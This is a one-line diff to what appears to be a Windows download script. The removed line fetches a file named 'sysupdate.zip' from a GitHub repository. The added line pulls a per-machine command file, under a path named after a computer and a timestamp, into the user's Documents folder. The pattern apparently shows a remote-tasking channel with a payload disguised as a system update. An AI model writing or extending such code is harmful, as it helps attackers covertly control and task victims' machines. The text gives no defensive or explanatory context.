@@ -1,1 +1,1 @@
-curl -L -o "C:\Users\HP ZBook\Documents\sysupdate.zip" https://github.com/0xHumanDev/oxhuman/raw/main/sysupdate.zip
+curl -L -o "C:\Users\HP ZBook\Documents\output_data.txt" https://github.com/0xHumanDev/oxhuman/raw/main/DESKTOP_POD793O/commands/2026-03-09/00-00-41_cmd_1773039637417150900_0.txt
